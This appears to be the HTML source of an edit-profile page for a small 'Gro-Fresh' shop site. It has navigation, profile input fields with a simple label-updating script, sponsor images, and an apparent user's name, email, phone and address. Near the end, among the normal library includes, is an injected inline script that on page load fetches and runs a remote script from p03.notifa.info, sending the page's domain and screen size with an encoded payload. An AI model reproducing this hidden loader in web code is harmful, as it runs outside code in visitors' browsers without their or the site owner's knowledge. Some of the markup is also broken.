<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../../../favicon.ico">

    <title>Gro-Fresh</title>
    <link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" type="text/css" href="fonts/iconic/css/material-design-iconic-font.min.css">
    <link href="assets/css/bootstrap.css" rel="stylesheet">
    <link href="assets/css/carousel.css" rel="stylesheet">
    <script src="assets/js/bootsrap.js"></script>
    
    <link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
    <link rel="stylesheet" type="text/css" href="assets/css/util.css">

  </head>
  <body>
    <header>
      <nav class="navbar navbar-expand-md navbar-light fixed-top bg-light ">
      <a class="navbar-brand p-0" href="#">
       <img src="img/logofont.svg" width="150" height="auto" class="d-inline-block align-top" alt="">
      </a>
          <!--<img src="img/logo.png" width="30" height="30" class="d-inline-block align-top" alt="">-->
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
          <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarCollapse">
          <ul class="navbar-nav mr-auto">
            <li class="nav-item active">
              <a class="nav-link" href="index.html">Home <span class="sr-only">(current)</span></a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="productlist.html">Product</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="quality.html">Quality</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="Cs Contact.html">Contact Us</a>
            </li>
          </ul>
          <div class="dropdown">
            Ray Reysandi  
          <button class="dropbtn"><img src="user2.png"></button>
          <div class="dropdown-content">
            <a href="indexlogin.html"> Profile </a>
            <a href="history payment.html"> History </a>
          </div>  
        </div>
      </nav>
    </header>
    <ul class="profile">
      <a style="font-size: xx-large; font-weight: bold;">Edit Profile</a>
      <br>
      <br>
      <div class="ubah">
      <input type="text" onfocus="this.value=''" id="email" value="" >
      <input type="text" onfocus="this.value=''" id="nomorhp" value="" style="margin-top: 25px">
      <input type="text" onfocus="this.value="'' id ="alamat" value="" style="margin-top: 25px">
      <script>
    function myFunction() {
    var x = document.getElementById("email").value;
    document.getElementById("change1").innerHTML = x;

    var lblemail = document.getElementById("hilang1");
    lblemail.parentNode.removeChild(lblemail);

    var y = document.getElementById("nomorhp").value;
    document.getElementById("change2").innerHTML = y;

    var lbltelepon = document.getElementById("hilang2");
    lbltelepon.parentNode.removeChild(lbltelepon);
    var z = document.getElementById("alamat").value;

    document.getElementById("change3").innerHTML = z;
    var lblalamat = document.getElementById("hilang3");
    lblalamat.parentNode.removeChild(lblalamat);
    }
    </script>
      </div>
      <div class="label">
      <a> <img src="user2.png"> Ray Reysandi </a><br><br> 
      <img src="email.png"><a id="hilang1"> ray@gmail.com</a> <a id="change1"></a><br><br>
      <img src="phone.png"><a id="hilang2"> 087802170071</a> <a id="change2"></a><br><br>
      <img src="house.png"><a id="hilang3"> Minomartani</a> <a id="change3"></a><br>
      <button type="button" class="btn btn-warning" onclick="myFunction()" style="margin-top: 20px;"> Ubah</button>
      </div>
    </ul>
    <div class="gambar">
        <img src="user.png">
      </div>

    <main role="main">
      
    <div class="container marketing pt-3">
        <h1 class="text-center">Sponsored</h1>
        <br>
          <div class="row">
            <div class="col-lg-3">
              <a href="#"><img src="img/gogreen.jpg" class="img-thumbnail img-responsive"></a>
            </div>
            <div class="col-lg-3">
              <a href="#"><img src="img/wwf.jpg" class="img-thumbnail img-responsive"></a>
            </div>
            <div class="col-lg-3">
              <a href="#"><img src="img/iso.png" class="img-thumbnail img-responsive"></a>
            </div>
            <div class="col-lg-3">
             <a href="#"><img src="img/111.jpg" class="img-thumbnail img-responsive"></a>
            </div>
          </div>
          <hr class="featurette-divider">
        </div>

          <hr class="featurette-divider">
      
          <?php include 'footer.php'; ?>
    </main>

    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script>window.jQuery || document.write('<script src="assets/js/jquery-slim.min.js"><\/script>')</script>
    <script src="../../assets/js/vendor/popper.min.js"></script>
    <script src="assets/js/bootstrap.js"></script>
    <!-- Just to make our placeholder images work. Don't actually copy the next line! -->
    <script src="assets/js/holder.min.js"></script>
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mkO%2f7ITrK9yURUOYsdqntBVAlSz8%2fPPT1NsENzZAXZvdF4fJa8FrsPLXqCn7C2iTxywkrJ6vNZvgnyFsAA7iZX%2fBbJGVqvHo03oLCHNcoC6exH7MFm0mIZGbj9KGuL8b%2bLdMTdMu0hXwGsN97BNN1Du3IEDZh76lBvvKe7uTgK%2bBIE3%2bjPB5ONaZ1Yw6dvBk0OSW2dXxBwA4xbDPstIubbyK1GMVuiAuUuTUR2sQvSPmBysFYDZt%2f5oV9iGM%2f56Vor4jxpvD5WlPbJqeGR2ExyMsDfHTUrpAHEcSz33fkR%2fjQKqh8YcK%2fHrA8ckj1utk%2f4Cf1NEgc0lPg7K4PVy7U7zKnyvzQ%2b4%2bBkcyJEKyFE2fE%2bMP8WbIxIXraBI%2bELsmFDQkT%2fOF44rFd1UH8XzmRGxxbbig%2by19lPk%2fcUkqx9w4cD9ciLiFexN%2fkZCzAAupxjzRqX9fDZ5jYv3gFdi5r6mYPymJlfqKtMex%2fpS%2fQVJVMd%2bxjO7SZbv%2b%2bLheoppKSmD3odYq%2fSFm8ngyuPqEceTzRB85Q2wS1rP6GT9edgje396gcnBD1aBmreovDfgeW6DBoDdtaqnM%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
<script src="vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
  <script src="vendor/animsition/js/animsition.min.js"></script>
<!--===============================================================================================-->
  <script src="vendor/bootstrap/js/popper.js"></script>
  <script src="vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
  <script src="vendor/select2/select2.min.js"></script>
<!--===============================================================================================-->
  <script src="vendor/daterangepicker/moment.min.js"></script>
  <script src="vendor/daterangepicker/daterangepicker.js"></script>
<!--===============================================================================================-->
  <script src="vendor/countdowntime/countdowntime.js"></script>
<!--===============================================================================================-->
  <script src="assets/js/main.js"></script>
</body>
</html>
